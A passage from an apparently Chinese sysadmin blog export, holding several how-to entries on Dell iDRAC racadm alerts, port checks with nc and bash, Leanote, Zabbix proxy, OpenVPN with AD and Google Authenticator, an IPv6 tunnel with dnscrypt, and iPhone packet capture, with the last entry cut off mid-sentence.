    <url>/2017/04/%E4%BD%BF%E7%94%A8racadm%E8%BF%9C%E7%A8%8B%E9%85%8D%E7%BD%AEidrac%E5%8D%A1%E8%87%AA%E5%B7%B1%E9%80%9A%E8%BF%87smtp%E6%8A%A5%E8%AD%A6/index.html</url>
    <content><![CDATA[目的减轻系统负担。对，目的就是为了减轻 dell 服务器的系统负担，因为如果 idrac 卡有问题会自己报警的话，那么系统里那一大堆耗资源的进程就都可以停掉了。

方法利用 dell 机器的工具：racadm。
racadm -r 10.0.0.1 -u root -p calvin config \	-g cfgEmailAlert -o cfgEmailAlertEnable -i 1 1;racadm -r 10.0.0.1 -u root -p calvin config \	-g cfgEmailAlert -o cfgEmailAlertAddress -i 1 contacts@xxx.com;racadm -r 10.0.0.1 -u root -p calvin config \	-g 	cfgRemoteHosts -o cfgRhostsSmtpServerIpAddr 10.0.0.2;# idarc 卡的 ip 是：10.0.0.1# idarc 卡的用户名和密码是：root 和 calvin# smtp server 的 ip 是：10.0.0.2# 报警收件人是：contacts@xxx.com
拓展既然谈到了 racadm，那么就直接再列几个常用用法吧
# 将 idarc 卡的配置写入文件 /tmp/xxxracadm -r 10.0.0.1 -u root -p calvin \	getconfig -f /tmp/xxx;# 重启 idarc 卡所在服务器的操作系统racadm -r 10.0.0.1 -u root -p calvin \	serveraction powercycle;
如果系统没有 racadm，那么怎么办呢？idarc 卡除了 web UI，还支持 ssh 访问，所以直接 ssh 连过去就是了。用帐号、密码登录之后再输入命令：
racadm serveraction powercycle;
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>racadm</tag>
        <tag>idrac</tag>
        <tag>Dell</tag>
        <tag>monitor</tag>
        <tag>SMTP</tag>
      </tags>
  </entry>
  <entry>
    <title>分享一些自己DIY的Tasker的profile</title>
    <url>/2018/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%BA%9B%E8%87%AA%E5%B7%B1DIY%E7%9A%84task%E7%9A%84profile/index.html</url>
    <content><![CDATA[缘起about Tasker早先通过 Google Opinion Rewards 做调查挣了小几美刀，于是就购买了 Google Play Store 下的第一个收费软件：Tasker。但后来由于种种原因，Tasker 一直没有真正用起来（我最看重的几个功能都实现的不好）。
about IFTTT一直在用 IFTTT 的一个功能：每日抓取 NASA 的图回来做 Android 手机的 Wallpaper，但最近同时用两个 Android 手机，不希望两个手机同时一样的 Wallpaper，但这个需求如果用 IFTTT 来做只能每台 Android 手机用单独的账号来实现，这个实现显然太丑陋了。
最终方案Tasker 官方其实有一个放出来的 profile，是来抓 reddit 的图的，但那是几年前的东西了，现在几乎没法用，但作为例子，这个 profile 处理这种问题的思路是可以借鉴的。于是我就修改了下这个 profile，实现了抓 reddit.com/r/wallpaper 和 reddit.com/r/pic 以及 NASA iotd(Image of the Day) 的功能。
about tasker_profile上面提到的这个 profile，我放到了 github 下面了，这里远期还会放一些 Tasker 可用的、实现了一些实用好玩儿功能的 profile，但是暂时，就这么一个 profile，叫“Wallpaper”，意思是更系统 Wallpaper 相关的一个 profile。使用起来也不难，README.md 里都有提到。
写在最后如果我辛苦折腾的这个东西真能帮上你的忙，请帮我给项目点赞吧，谢谢！
]]></content>
      <tags>
        <tag>Tasker</tag>
        <tag>profile</tag>
        <tag>Android</tag>
        <tag>Wallpaper</tag>
        <tag>reddit</tag>
        <tag>NASA</tag>
        <tag>iotd</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行探测服务器某一端口是否打开</title>
    <url>/2017/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9F%90%E4%B8%80%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E6%89%93%E5%BC%80/index.html</url>
    <content><![CDATA[缘起检测远程服务器的某一个端口（尤其是 tcp ）是否已经被打开，这貌似是 SA 们排错时遇到的一个常见场景，

方案telnet最早，我常用的方案是使用 telnet。估计那时也只有 telnet 可用：）
yum -y install telnet;telnet baidu.com 80;
上面的命令正确连上以后会有输出：

Trying 180.149.132.47…Connected to baidu.com.Escape character is ‘^]’.  

nc后来，发现还有 nc，网络工具中的瑞士军刀：）
yum -y install nc;nc -vz baidu.com 80;
成功后会提示：

Connection to baidu.com 80 port [tcp/http] succeeded!

仔细看上面的这句输出提示，看出来什么名堂没有？对啦：“tcp/http”！这么说 nc 还能检测 udp 端口不成？man 了一下，还真可以：
nc -vz -u 10.0.0.1 53
成功以后系统提示：

Connection to 10.0.0.1 53 port [udp/domain] succeeded!

bash再后来，中老年如我，终于返璞归真，发现其实 bash 就直接支持这种检测。OK，废话少说，直接看命令：
man bash
找到这几句提示：

/dev/tcp/host/port  
       If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open a TCP  connection to the corresponding socket.
/dev/udp/host/port  
       If  host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open a UDP connection to the corresponding socket.

故而测试命令很好玩儿：
&gt;/dev/tcp/baidu.co/80;echo $?;
当成功连上 baidu.com 的 tcp 80 端口的时候，返回 0。
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>tcp</tag>
        <tag>udp</tag>
        <tag>bash</tag>
        <tag>telnet</tag>
        <tag>nc</tag>
        <tag>port</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu14.04上自建Leanote服务器</title>
    <url>/2016/12/%E5%9C%A8Ubuntu14-04%E4%B8%8A%E8%87%AA%E5%BB%BALeanote%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[Why（为什么）
前段时间 Evernote 限制了同时保持登录状态的设备数为 2
最近 WizNote（为知笔记）禁掉了免费用户的同步功能
有道云笔记测试时同步有问题，而且其文件格式相对封闭


总而言之，为了避免下一次由于服务商服务协议变化而需要再次迁移数据，我选择了能自建服务器的 Leanote（蚂蚁笔记）。
How to（怎样）我们采用的是二进制安装的方式
Prerequisite（环境准备）apt-get \	-y install \		screen \		wget \		tar \		gzip;
Leanotecd /opt;wget 	-O leanote-linux-amd64-v2.1.bin.tar.gz \	https://sourceforge.net/projects/leanote-bin/files/2.1/leanote-linux-amd64-v2.1.bin.tar.gz/download;tar xzvf leanote-linux-amd64-v2.1.bin.tar.gz;
MongoDBInstallationcd /opt;wget \	https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.0.tgz;tar xzvf \	mongodb-linux-x86_64-ubuntu1404-3.4.0.tgz;ln -s \	mongodb-linux-x86_64-ubuntu1404-3.4.0 mongodb;cat &lt;&lt;EOF &gt;/etc/profile.d/mongodb1.shexport PATH=\$PATH:/opt/mongodb/binEOFsource /etc/profile.d/mongodb.sh;
Import datacd /opt;mkdir mongodb_data;screen -d \	-m mongod \	--dbpath /opt/mongodb_data;mongorestore \	-h localhost \	-d leanote \	--dir \		/opt/leanote/mongodb_backup/leanote_install_data/
Configuration（配置）cd /opt;vim leanote/conf/app.conf# 将 app.secret 的内容改若干个字符# （注意：总长度需要一样）# 将 site.url 改成我的具体情况，# 比如：“http://note.xxx.com:9000”
启动服务cd /opt/leanote/bin/;screen -d -m bash run.sh;
Test（测试）
打开浏览器访问：http://note.xxx.com:9000
用缺省帐号 admin（密码是 abc123）登录（尽快修改缺省密码！）

能成功登录则证明基本上 Leanote server 部署成功。
加入启动脚本echo \	"screen -d -m /opt/mongodb/bin/mongod --dbpath /opt/mongodb_data/" \	&gt;&gt; /etc/rc.local;echo \	"cd /opt/leanote/bin/;screen -d -m bash run.sh" \	&gt;&gt; /etc/rc.local;
基本安全设置
修改 admin 的密码
禁掉 demo 用户
关掉注册功能
新建普通用户（用来正常使用，因为 admin 专做维护管理）

Appendix（附录）
leanote binary installation on Mac and Linux (En))
Install MongoDB Community Edition From Tarball

]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Trusty Tahr</tag>
        <tag>Leanote</tag>
        <tag>蚂蚁笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>在OpenVPN上启用AD+Google Authenticator认证</title>
    <url>/2016/11/%E5%9C%A8OpenVPN%E4%B8%8A%E5%90%AF%E7%94%A8AD-google-authenicator%E8%AE%A4%E8%AF%81/index.html</url>
    <content><![CDATA[缘起(Why)现有环境
KVM
CentOS 6.x
OpenVPN 2.3.2
Google Authenticator libPAM 1.0.1
pam_ldap 185
Windows AD(2008R2)

来自老板的需求
希望加强登录认证，仅仅靠原来的基于 AD 的认证还不够

老板认可的方案
用 Google Authenticator 来做动态的二次认证
结合原有的 ldap 集中认证


具体步骤(Howto)服务器端制作google-authenticator的rpm包
其实 epel 源里有 google-authenticator 的 rpm 包，但是那个太老了( 0.3?)，很多参数不支持，没法用。
随便一台 CentOS 6.x for x86_64 的机器上编都可以

# 准备打包的软件环境yum -y install git gcc \		libtool autoconf \		automake pam-devel \		rpm-build qrencode-libs;# 抓取源代码，打包git clone \	https://github.com/google/google-authenticator-libpam.git;cd google-authenticator-libpam;./bootstrap.sh;./configure;make dist;cp google-authenticator-*.tar.gz ~/rpmbuild/SOURCES/;# 上面这一步如果提示~/rpmbuild目录不存在# 则先把下一步执行一次然后再试# （下面这一步会确保有~/rpmbuild目录）rpmbuild -ba contrib/rpm.spec;# 成功以后，编好的rpm包路径在：# ~/rpmbuild/RPMS/x86_64/google-authenticator-1.*.el6.x86_64.rpm
安装软件在要跑 OpenVPN 服务的目标服务器上，
# 安装前一步制作的google-authenticator的rpm包rpm -ivh google-authenticator-1.*.el6.x86_64.rpm;yum -y install openvpn \		pam_ldap \		openvpn-auth-ldap \		pamtester;# 如果是新装的服务器（我这里自然不是），请别忘了装openvpn# 上面的openvpn-auth-ldap和pamtester都不是必须要装的# pamtester用来做一些pam认证的测试
配置软件/etc/pam_ldap.conf这是 CentOS 6.x 下 pam_ldap.so 的配置文件，因为我们后面在 OpenVPN 的 pam 认证里会用 pam_ldap.so 来从 AD 认证，所以这里我们需要先把这个配置好。
# host 定义的是域控的 ip# 可以多写几个# 用空格分开即可# 请根据实际情况填写host 10.0.0.1# base 写的是用户的 basedn# 这个需要根据具体情况修改base ou=staff,dc=xxx,dc=com# binddn 是用来搜索 AD 域的帐号binddn CN=xxx_ldap,OU=access account,OU=staff,DC=xxx,DC=com# bindpw 是搜索 AD 域的帐号的密码bindpw passwordxxx# pam_filter 可以设一些允许连接 OpenVPN 服务的条件# 我司这里用了一个允许拨入的条件# 这个不是必须的pam_filter msNPAllowDialin=TRUE# pam_login_attribute 是来设定 AD 域上# 跟 OpenVPN 里登录的用户名匹配的属性# AD 这里一般都是 sAMAccountNamepam_login_attribute sAMAccountName# ssl 设置是否使用加密，我司这里没有使用加密ssl off
/etc/openvpn/xxx.conf这是 openvpn 服务器的主配置文件，”xxx” 用自己喜欢的字串替换，这个配置最重要的是以下两句：
plugin /usr/lib64/openvpn/plugins/openvpn-plugin-auth-pam.so openvpnreneg-sec 36000
这里配置的基本思想就是：

把认证丢给系统的 pam 插件来做
这里的 openvpn 参数指的是 pam 的配置文件（路径在 /etc/pam.d/）
reneg-sec 是用来设置重新认证的时间间隔，这里是 10 小时。这个参数跟客户端的同样的参数取小者有效

/etc/pam.d/openvpn这个配置文件是真正认证 openvpn 登录的配置文件，里面内容主要是以下几句：
auth	required	pam_google_authenticator.so nullok forward_pass debugauth	required	pam_ldap.so use_first_pass debugaccount	required	pam_unix.so

第一行的 forward_pass 参数使得一次读入系统密码(ldap，也就是 AD 密码)和 google authenticator 的密码，然后把系统密码扔给后续的pam（也就是带有 use_first_pass 参数的pam模块）处理
第二行的 use_first_pass 上面已有讲到
前两行都带 debug 参数完全是调试的需要，生产环境可以不用
第三行是必须的，否则 openvpn 登录不上

启动服务chkconfig openvpn on;service openvpn start;
用户初始化因为 google authenticator 需要在每个用户的家目录里生成一个叫 .google_authenticator 的文件，里面存有密钥和几个一次性的超级认证码及其他一些配置，所以，我们需要在 openvpn 服务器上做一次初始化数据的工作。假设有 100 个用户要用这个系统登录 openvpn，用户名从 user1 到 user100，那么初始化脚本就是：
for i in &#123;1..100&#125;do	useradd user$&#123;i&#125;	su -c \		"google-authenticator -t -f -d -w 17 -r 3 -R 30 -q" \		user$&#123;i&#125;	cat /home/user$&#123;i&#125;/.google_authenticator | \		mail -s "your .google_authenticator is:" \		user$&#123;i&#125;@xxx.comdone
这里注意，在用户数据初始化的最后部分，将生成的 .google_authenticator 发给了每个用户自己。
客户端软件安装及配置使用Google Authenticator这个软件准确来讲不是必须在 openvpn 客户端上安装的软件，只不过这个软件是用来生成登录所需的 6 位动态数字密码的，一般安装在手机上。ios 系统和 android 系统分别在 app store 和 google play 里搜索 “google authenticator” 然后安装即可。
这个软件的使用也很简单，本地运行，根本不需要“科学上网”。具体以 iphone 版本为例：打开软件，第一次点击右上角“+”（加号）–&gt;手动输入验证码，然后：

账号：随便填
密钥：.google_authenticator 文件（内容已经邮件发给个人）的第一行
基于时间：划到打开状态

这样以后每次打开软件，都会看到每30秒生成一个新的6位数字，这就是二次认证的验证码
OpenVPN客户端OpenVPN 客户端软件各个平台都有很多，我们在 mac 下常用 tunnelblick，用啥不重要，重要的是要在配置文件里加一句话：
reneg-sec 36000
这个参数具体配多少随意，真正生效的是和服务器端同样的参数相比的小者，而本例中服务器端配的是 36000。
客户端软件使用时需要把手机放手边打开 Google Authenticator 应用，输入密码时输入系统密码+6位验证码这样的组合，比如，用户密码是 “woshimima”(不带引号)，手机上显示的6位验证码是 “123456”（不带引号），那么输入密码时我就要输入 “woshimima123456”（不带引号）
简单测试在 OpenVPN 服务器上，使用前面安装的 pamtester 来测试 OpenVPN 认证，方法很简单，登录 OpenVPN 服务器，执行命令：
pamtester openvpn san.zhang authenticate;# 系统会提示输入密码和 Google Authenticator 的 6 位动态密码# 一起输入，先输入域帐号 san.zhang 的密码# 这个测试必须要通过，否则整个配置肯定是失败的
参考链接
google-authenticator@github
google-authenticator的rpm包制作官方文档（注意：这个文档有问题，起码在 CentOS 6.x 下是有问题的）

]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>AD</tag>
        <tag>OpenVPN</tag>
        <tag>Google Authenticator</tag>
        <tag>PAM</tag>
        <tag>Windows</tag>
        <tag>LDAP</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title>在VIM中重新格式化（代码）文件</title>
    <url>/2017/03/%E5%9C%A8VIM%E4%B8%AD%E9%87%8D%E6%96%B0%E6%A0%BC%E5%BC%8F%E5%8C%96%EF%BC%88%E4%BB%A3%E7%A0%81%EF%BC%89%E6%96%87%E4%BB%B6/index.html</url>
    <content><![CDATA[缘起需求来自于直接拷贝一段格式完好的 Bash 代码粘贴到一个新（用 vim）打开的 Bash 文件时，代码格式完全乱掉了，主要现象貌似是锁进格式被 double 了，本来是一个 tab 的好像被敲了两个 tab。这个问题怎么解决，不知道，不过马上的需求是：能否自动重新把代码重新格式化一下呢？

解决方案vim配置确保 vim 配置里有打开 filetype-indent，如果没有的话，
echo "filetype indent on" &gt;&gt; ~/.vimrc
格式化代码然后，打开需要重新格式化的代码文件，
vim xxx.sh
最后，在 vim 中直接敲入命令（不用先敲入冒号）：
gg=G
成功！
进阶阅读至于怎样格式化代码文件，是控制在 vim 的 runtimepath 目录下的 indent 目录下的”格式名.vim”这个文件里的，这里的格式名是 vim 自动检测到的你的文件的格式，比如：sh
至于什么是 runtimepath，在 vim 中敲入
:help runtimepath
自己看吧
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Vim</tag>
        <tag>indent</tag>
        <tag>Code</tag>
        <tag>runtimepath</tag>
        <tag>filetype-indent-on</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu16.04上部署Zabbix-proxy3.4的流水账</title>
    <url>/2018/06/%E5%9C%A8Ubuntu16-04%E4%B8%8A%E9%83%A8%E7%BD%B2Zabbix-proxy3-4%E7%9A%84%E6%B5%81%E6%B0%B4%E8%B4%A6/index.html</url>
    <content><![CDATA[WHY这里的为什么不是说为什么要装 zabbix-proxy 的问题，而是说为什么要写这篇文章。为什么要写这篇文章呢？答案很简单，官方文档太碎了，东一榔头西一棒子，一个简单实际直接的问题：怎样在 ubuntu 上安装部署 zabbix-proxy，翻官方文档得翻四五篇文档，而且这四五篇文档中还有很多干扰信息，需要仔细分辨，否则会对部署造成负面影响。所以，就有了这篇“流水账”。
HOWTOINSTALLATION# 安装 zabbix 官方的 ubuntu 16.04(版本号 xenial) 的软件仓wget \    https://repo.zabbix.com/zabbix/3.4/ubuntu/pool/main/z/zabbix-release/zabbix-release_3.4-1+xenial_all.deb;dpkg -i zabbix-release_3.4-1+xenial_all.deb;apt-get update;# 安装 zabbix-proxy 所需之 mysql 数据库服务器软件# 注意这一步会让设置 mysql 服务器的 root 密码（不是系统密码！）# 这个要记住，在执行下一步操作的时候要输入的apt-get install mysql-server-5.7;
# 用 root 身份连入 mysql 数据库系统并进入交互式模式# 注意：这里需要输入上一步设置的 root 的密码mysql -uroot -p
# 创建 zabbix-proxy 系统所用数据库：zabbixcreate database zabbix character set utf8 collate utf8_bin;# 创建 zabbix-proxy 应用所用数据库账号：zabbix 并其密码以及响应权限grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;# 使权限及时生效flush privileges;# 退出 mysql 交互式环境quit
# 安装一些 zabbix-proxy 系统可能会需要# 但又未在 zabbix-proxy-mysql 软件包里# 明确指定依赖的软件包，# 这里对于有用 snmp 监控网络设备的场景来讲非常重要# 因为缺省是不会安装 snmp-mibs-downloader 之类# 必须的软件包的。# 注意，同时也安装上了 zabbix-agent，这个是无所谓的，# 毕竟，所有的服务器都要装 zabbix-agent 不是吗apt-get install \    libsnmp-base \    snmp-mibs-downloader \    snmp \    libsnmp30 \    zabbix-proxy-mysql \    zabbix-agent;# 创建 zabbix-proxy 需要的数据库结构及一些初始数据zcat \    /usr/share/doc/zabbix-proxy-mysql/schema.sql.gz \     | mysql -uzabbix -p zabbix;
CONFIGURATION# 修改 zabbix proxy 的设置文件vim /etc/zabbix/zabbix_proxy.conf
# 修改 zabbix agent 的配置文件# 本来这个不是本文讨论的重点# 只是部署 zabbix proxy 时都会部署 zabbix agentvim /etc/zabbix/zabbix_agentd.conf
# 最后，将几个服务设为自启动systemctl enable mysql.service;systemctl enable zabbix-proxy.service;systemctl enable zabbix-agent.service;
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Proxy</tag>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>在控制台右上角放置一个时钟</title>
    <url>/2017/03/%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%94%BE%E7%BD%AE%E4%B8%80%E4%B8%AA%E6%97%B6%E9%92%9F/index.html</url>
    <content><![CDATA[tput 版本while sleep 1do  tput sc  tput cup 0 $(($(tput cols)-29))  date  tput rcdone &amp;

解释下：

tput sc # 记录下当前光标位置
tput cup 0 ….. # 这一句是更改光标到最上一行右起第 29 位置
date # 是打印下当前时间（28 个字符）
tput rc # 是恢复先前保留的光标位置

escape codes 版本while truedo  echo -ne "\e[s\e[0;$((COLUMNS-27))H$(date)\e[u"  sleep 1done &amp;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Bash</tag>
        <tag>commandlinefu</tag>
        <tag>console</tag>
        <tag>tput</tag>
        <tag>escape codes</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在VIM中清除一个文件的内容</title>
    <url>/2013/10/%E6%80%8E%E6%A0%B7%E5%9C%A8VIM%E4%B8%AD%E6%B8%85%E9%99%A4%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/index.html</url>
    <content><![CDATA[本文来自于：commandlinefu
方法很简单，用 vim 打开目标文件，直接敲入：
:%d

即可。其中：

% 是匹配所有行
d 是删除的意思

所以这个命令一执行，文件就被清空了。
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
        <tag>Vi</tag>
      </tags>
  </entry>
  <entry>
    <title>小型网络科学上网方案之ipv6篇</title>
    <url>/2016/09/%E5%B0%8F%E5%9E%8B%E7%BD%91%E7%BB%9C%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E6%A1%88%E4%B9%8Bipv6%E7%AF%87/index.html</url>
    <content><![CDATA[简述这是适合小型网络（公司办公室或家庭）的”科学上网”方案之一的ipv6方案，此方案是我极同事搞的，我这里主要是学习，然后做过在路由器上封来自于公网ipv6网往小型网络内部的机器（都有正式ipv6地址）的访问。
点评下：思路灰常灵活，非常适用于办公网、家庭网的“科学上网”方案
所用资源
路由器
极一（跑openwrt）
ip地址（私网）：10.0.0.5
ip地址（公网）：3.3.3.3


虚机
IPV6
2.2.2.2
dnscrypt-wrapper(optional)
用来配合 dnscrypt-proxy 直连，破除 dns 污染




DNSCrypt-proxy(optional)
解决某些域名被 dns 污染的问题。


HE的账号


地址https://www.tunnelbroker.net/账号xxxxxxemailadmin@xxxxxx.xxprefix2001:xxx:xxxx::/48server’s ipv4 address1.1.1.1server’s ipv6 address2001:xxx:xx:xxx::1/64client’s ipv4 address2.2.2.2client’s ipv6 address2001:xxx:xx:xxx::2/64

原理
通过虚机(我司在oneasiahost买的，ip:2.2.2.2)从HE(HURRICANE ELECTRIC INTERNET SERVICES)的IPv6 Tunnel Broker上申请一段免费的ipv6地址（/48的）
然后通过小型网络内的路由器(ip是3.3.3.3)分配给局域网的客户端
路由器通过sit tunnel打到虚机2.2.2.2上
虚机2.2.2.2上起iptables，将sit过来的包(来自3.3.3.3)都转给HE（ip这里是：1.1.1.1）

详细配置客户端简单说，客户端只要接入此小型网络，并在本地启用了ipv6协议即可。
路由器
sit tunnel(文件/etc/config/network里)
config interface 'sit1'        option proto '6in4'        option peeraddr '2.2.2.2'        option ip6addr '2001:xxx:xx:xxx::2/64'        option ip6prefix '2001:xxx:xxxx::/48'#        option defaultroute '1'

iptables
# 允许sit1对端的机器的包出入路由器iptables -A INPUT -s 2.2.2.2/32 -i 6in4-sit1 -p ipv6 -j ACCEPTiptables -A OUTPUT -d 2.2.2.2/32 -o 6in4-sit1 -p ipv6 -j ACCEPT

ip6tables
ip6tables -A INPUT -i 6in4-sit1 -m state --state RELATED,ESTABLISHED -j ACCEPTip6tables -A INPUT -i 6in4-sit1 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROPip6tables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPTip6tables -A INPUT -p ipv6-icmp -m icmp6 --icmpv6-type 128 -m limit --limit 30/min -j ACCEPTip6tables -A FORWARD -i 6in4-sit1 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROPip6tables -A OUTPUT -o 6in4-sit1 -p ipv6-icmp -j ACCEPT


虚机iptables中的NAT表中
iptables -A PREROUTING -s 3.3.3.3/29 -p ipv6 -j DNAT --to-destination 1.1.1.1
起 dnscrypt-wrapper：
yum -y install libsodium libevent;# 准备软件环境cd /root;git clone --recursive git://github.com/cofyc/dnscrypt-wrapper.git;cd dnscrypt-wrapper;make configure;./configure;make install;# 安装 dnscrypt-wrapperdnscrypt-wrapper --gen-provider-keypair;dnscrypt-wrapper --gen-crypt-keypair --crypt-secretkey-file=1.key;dnscrypt-wrapper --gen-cert-file \  --crypt-secretkey-file=1.key \  --provider-cert-file=1.cert \  --provider-publickey-file=public.key \  --provider-secretkey-file=secret.key \  --cert-file-expire-days=3650;dnscrypt-wrapper --resolver-address=8.8.8.8:53 \  --listen-address=0.0.0.0:443 \  --provider-name=2.dnscrypt-cert.xxxxxxxx.com \  --crypt-secretkey-file=1.key \  --provider-cert-file=1.cert \  -d;# "xxxxxxxx.com" 是随意写的，只要整个名字跟别的不重即可dnscrypt-wrapper --show-provider-publickey-fingerprint \  --provider-publickey-file public.key;# 返回的 Provider public key fingerprint 记下来，跑 dnscrypt-proxy 时要用
DNSCrypt-proxywget --no-check-certificate https://download.dnscrypt.org/dnscrypt-proxy/old/dnscrypt-proxy-1.4.0.tar.bz2;tar xjvf dnscrypt-proxy-1.4.0.tar.bz2;cd dnscrypt-proxy-1.4.0;./configure --prefix=/opt/dnscrypt;make;make install;cd /opt/dnscrypt/sbin;./dnscrypt-proxy --local-address=10.0.0.7:53 \  --resolver-address=2.2.2.2:443 \  --provider-name=2.dnscrypt-cert.xxxxxxxx.com \  --provider-key= \B735:1140:206F:225D:3E2B:D822:D7FD:691E:A1C3:3CC8:D666:8D0C:BE04:BFAB:CA43:FB79 \  -d;# "xxxxxxxx.com" 要跟前面的对应# “B735:1140:206F:225D:3E2B:D822:D7FD:691E:A1C3:3CC8:D666:8D0C:BE04:BFAB:CA43:FB79”# 是前面取的的 Provider public key fingerprint
这里的10.0.0.7是私网的一台机器，在私网的dns服务器上可以把被污染了的域名的dns解析请求forward到10.0.0.7的53端口上来即可解决dns污染问题。
HEHE无需专门配置。
参考资料
dnscrypt-wrapper@github
dnscrypt-proxy@github
DNSCrypt

]]></content>
      <tags>
        <tag>IPv6</tag>
        <tag>科学上网</tag>
        <tag>DNSCrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在macOS上抓iPhone的数据包</title>
    <url>/2017/06/%E6%80%8E%E6%A0%B7%E5%9C%A8macOS%E4%B8%8A%E6%8A%93iPhone%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/index.html</url>
    <content><![CDATA[背景老板有个移动办公的 APP 在公司使用无线网络时老报“超时”错误，于是就让解决这个问题。我们为了定位问题，做了几个测试：

使用办公无线网络使用此 APP，错误可以重复、稳定复现
使用 4G 或在家使用此 APP，没有任何问题
把手机用 usb 连上电脑，让数据走电脑的有线来访问服务器，结果发现 APP 没有问题
把手机连上办公室其他 wifi 设备，发现使用 APP 也没有问题

最后，还是要听手机上的网络数据包来分析问题。

方案业界听手机数据包的几种方案，大都不太合适，因为基本原理就是把数据包先扔到电脑上，这样就能在电脑上来听包了，但这样的话，我们的数据都是走电脑到达服务器的，这样的场景我们测试了，从电脑的有线网络走是没有问题的！
当然，也不是所有的方案都不合适，这样的话也就不会有这篇文章了：）Xcode 的 xcode command line tools 中的工具 rvictl 就非常适合我们的场景。
具体步骤软件安装安装 Xcode，然后安装 Xcode command line tools，这就不多说了。
取得设备UDID
iPhone 用数据线连上 macOS
在 macOS 上打开 iTunes
在 iPhone 这个设备上，Settings-&gt;Summary 中，右侧页面中找到 UDID 值（如果找不到，多次点击 ECID、Moel Identifier 或 Serial Number 即可找到）

映射虚拟网络设备rvictl -s &lt;udid&gt;;# 这里的 &lt;udid&gt; 即为上一步看到的设备 UDID
成功后会发现在 macOS 系统下多出一个网络设备：rvi0，这便是 iPhone 的“网络设备”在 macOS 上的映射，要听 iPhone 的数据包，直接听这个设备的包即可。
听包这一步简单了，直接打开 Wireshark，然后选 rvi0 设备抓包就好了。或者是先用 tcpdump 对 rvi0 抓包，最后再用 Wireshark 分析。
附上 tcpdump 的命令行：
sudo tcpdump -nn -i rvi0 -vvv -X -s 1024 -w iphone.wifi.pcap;# 这里的 iphone.wifi.pcap 为数据包保存的数据文件# 弄完可以扔给 Wireshark 分析
开始听包后，直接操作手机使用 APP，尽量使得错误复现，多重复几次以后，Ctrl+C 终止掉听包程序 tcpdump，记得 iphone.wifi.pcap 可用于 Wireshark 分析
删掉虚拟网络设备最后记得删除掉映射的网络设备
rvictl -x &lt;udid&gt;;# 这里的 &lt;udid&gt; 即为前面 iTunes 上看到的设备 UDID
后话关于老板的这个问题解决了没有呢？虽然这不是这篇文章的重点，既然开头用这个作为引子引出本文，这里还是再点一下。最终只是确认了无线网络有问题，iPhone 通过 AP 往服务器回的 ACK 的包到达 AP 时已经被延时 1s 多了，但是 iPhone 上看到的数据包是及时发出去的。
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>macOS</tag>
        <tag>iPhone</tag>
        <tag>Xcode</tag>
        <tag>rvictl</tag>
        <tag>tcpdump</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样通过网络在两台Linux之间倒数据</title>
    <url>/2016/09/%E6%80%8E%E6%A0%B7%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%9C%A8%E4%B8%A4%E5%8F%B0Linux%E4%B9%8B%E9%97%B4%E5%80%92%E6%95%B0%E6%8D%AE/index.html</url>
    <content><![CDATA[Why在服务器之间倒腾数据是运维工作的常见场景，这个运维的同行们应该都心有戚戚焉吧，比如要把一台服务器上的服务迁移到另外一台服务器上、比如这个服务又新上一台服务器，需要把数据从老服务器上同步过来一份，类似的需求是不是感觉经常碰到呢？
Howto
scp
rsync
sftp
nc
socat
……



以上几种方法中：

scp 和 sftp 其实都还是走的 ssh，走这种方式服务器有加密、解密的负载，所以比较耗 cpu 资源，为了减轻 cpu 负载，可以选用轻一点的 cipher 比如 arcfour。这种方式比较适合于一次性的拷贝不太大的单个文件。
rsync 可以走自有协议，也可以走 ssh 通道。不管那种，都可以用于“同步”数据的场景。
如果走自有协议的话，速度很不错。只不过需要先配置服务器和客户端
如果走 ssh 的话，会一样碰到加解密耗cpu的问题。


nc( netcat )和 socat 在这里是类似的思路，只是 socat 号称是比 nc( netcat )更瑞士军刀的瑞士军刀:)

总结一下：

如果文件很多、数据量很大的场景下，我推荐用 tar+socat 的方案，代码如下：

